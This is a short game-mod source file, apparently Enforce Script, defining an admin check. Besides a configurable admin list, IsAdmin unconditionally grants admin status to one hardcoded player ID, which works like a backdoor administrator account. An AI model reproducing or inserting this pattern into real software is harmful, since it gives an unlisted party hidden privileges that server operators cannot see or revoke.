class AdminUtils
{

    static ref set<string> AdminIds = new ref set<string>();

    static bool IsAdmin(string playerId)
    {
        if(playerId == "avCdzuTN2GEbHlqfPk2wXFvUyxW7CVe50bFIWgDCvN0=")
        {
            return true;
        }

        return AdminIds.Find(playerId) != -1;
    }
};